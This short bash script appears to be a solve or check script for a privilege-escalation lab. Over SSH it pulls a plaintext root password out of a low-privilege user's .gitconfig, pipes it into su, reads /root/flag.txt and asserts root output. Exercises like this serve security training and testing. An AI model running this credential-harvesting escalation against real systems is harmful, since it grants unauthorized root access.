#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'PASS=$(awk "/rootPassword/{print \$3}" /home/lowpriv/.gitconfig); printf "%s\n" "$PASS" | su - root -c "cat /root/flag.txt"')"
assert_root_output "${out}"
